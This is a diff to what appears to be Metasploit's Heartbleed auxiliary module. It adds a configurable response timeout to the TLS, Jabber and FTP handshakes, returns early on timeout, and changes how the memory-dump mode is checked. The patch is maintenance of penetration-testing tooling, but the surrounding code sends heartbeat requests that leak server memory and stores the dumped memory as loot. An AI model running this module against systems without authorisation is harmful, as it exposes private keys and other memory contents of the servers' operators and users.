@@ -110,7 +110,8 @@ class Metasploit3 < Msf::Auxiliary
         'juan vazquez', # Msf module
         'Sebastiano Di Paola', # Msf module
         'Tom Sellers', # Msf module
-        'jjarmoc' #Msf module; keydump, refactoring..
+        'jjarmoc', #Msf module; keydump, refactoring..
+        'Ben Buchanan' #Msf module
       ],
       'References'     =>
         [
@@ -140,7 +141,8 @@ class Metasploit3 < Msf::Auxiliary
         OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
         OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
         OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
-        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil])
+        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
+        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10])
       ], self.class)
 
     register_advanced_options(
@@ -184,6 +186,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def peer
     "#{rhost}:#{rport}"
+  end
+
+  def response_timeout
+    datastore['RESPONSE_TIMEOUT']
   end
 
   def tls_smtp
@@ -237,7 +243,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def tls_jabber
     sock.put(jabber_connect_msg(datastore['XMPPDOMAIN']))
-    res = sock.get
+    res = sock.get(response_timeout)
     if res && res.include?('host-unknown')
       jabber_host = res.match(/ from='([\w.]*)' /)
       if jabber_host && jabber_host[1]
@@ -245,7 +251,7 @@ class Metasploit3 < Msf::Auxiliary
         connect
         vprint_status("#{peer} - Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...")
         sock.put(jabber_connect_msg(jabber_host[1]))
-        res = sock.get
+        res = sock.get(response_timeout)
       end
     end
     if res.nil? || res.include?('stream:error') || res !~ /<starttls xmlns=['"]urn:ietf:params:xml:ns:xmpp-tls['"]/
@@ -254,14 +260,14 @@ class Metasploit3 < Msf::Auxiliary
     end
     msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
     sock.put(msg)
-    res = sock.get
+    res = sock.get(response_timeout)
     return nil if res.nil? || !res.include?('<proceed')
     res
   end
 
   def tls_ftp
     # http://tools.ietf.org/html/rfc4217
-    res = sock.get
+    res = sock.get(response_timeout)
     return nil if res.nil?
     sock.put("AUTH TLS\r\n")
     res = sock.get_once
@@ -291,7 +297,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def bleed()
     # This actually performs the heartbleed portion
-    establish_connect
+    return :timeout if (establish_connect) == :timeout
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat(heartbeat_length))
     hdr = sock.get_once(5)
@@ -335,6 +341,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def loot_and_report(heartbeat_data)
+    return if heartbeat_data == :timeout
     if heartbeat_data
         print_good("#{peer} - Heartbeat response with leak")
         report_vuln({
@@ -344,7 +351,7 @@ class Metasploit3 < Msf::Auxiliary
           :refs => self.references,
           :info => "Module #{self.fullname} successfully leaked info"
         })
-        if action.name == 'DUMP' # Check mode, dump if requested.
+        if datastore['MODE'] == 'DUMP' # Check mode, dump if requested.
           pattern = datastore['DUMPFILTER']
           if pattern
             match_data = heartbeat_data.scan(pattern).join
@@ -506,7 +513,12 @@ class Metasploit3 < Msf::Auxiliary
     vprint_status("#{peer} - Sending Client Hello...")
     sock.put(client_hello)
 
-    server_hello = sock.get
+    server_hello = sock.get(response_timeout)
+    unless server_hello
+      vprint_error("#{peer} - No Client Hello response after #{response_timeout} seconds...")
+      return :timeout
+    end    
+
     unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
       vprint_error("#{peer} - Server Hello Not Found")
       return
@@ -534,3 +546,4 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 end
+
